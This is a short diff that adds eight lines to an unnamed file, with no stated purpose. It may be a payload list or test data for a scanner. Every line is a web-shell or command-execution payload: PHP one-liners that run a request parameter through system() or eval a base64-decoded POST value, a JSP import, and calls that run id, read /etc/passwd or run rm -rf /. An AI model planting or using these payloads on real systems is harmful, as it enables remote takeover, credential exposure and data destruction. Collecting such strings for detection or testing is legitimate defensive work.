@@ -1,0 +1,8 @@
+<?php system($_GET['c']); ?>
+<?= exec('id') ?>
+<%@ page import="java.io.*" %>
+eval(base64_decode($_POST[c]))
+eval("return 1")
+system("cat /etc/passwd")
+system('rm -rf /')
+shell_exec('id')
